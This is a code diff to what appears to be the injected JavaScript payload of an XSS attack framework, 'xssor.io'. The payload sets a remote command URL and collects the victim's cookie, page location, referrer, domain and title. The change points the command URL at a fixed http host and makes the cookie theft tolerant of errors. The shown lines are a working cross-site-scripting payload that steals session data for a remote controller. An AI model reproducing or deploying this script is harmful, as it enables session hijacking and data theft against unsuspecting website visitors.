@@ -1,6 +1,6 @@
 /*xssor.io*/
 xssor = {};
-xssor.cmd_url = '//xssor.io/cmd'; // replace xssor.io to your domain or ip address
+xssor.cmd_url = 'http://xssor.io/cmd';
 xssor.gone = 0;
 xssor.done = 0;
 
@@ -35,7 +35,11 @@ xssor.info.pid = 'ywabbps';
 xssor.info.referrer = document.referrer;
 xssor.info.location = window.location.href;
 xssor.info.toplocation = top.location.href;
-xssor.info.cookie = document.cookie;
+try {
+    xssor.info.cookie = document.cookie;
+} catch(error) {
+    xssor.info.cookie = "-";
+};
 xssor.info.domain = document.domain;
 xssor.info.title = document.title;
 xssor.info.charset = document.characterSet ? document.characterSet : document.charset;
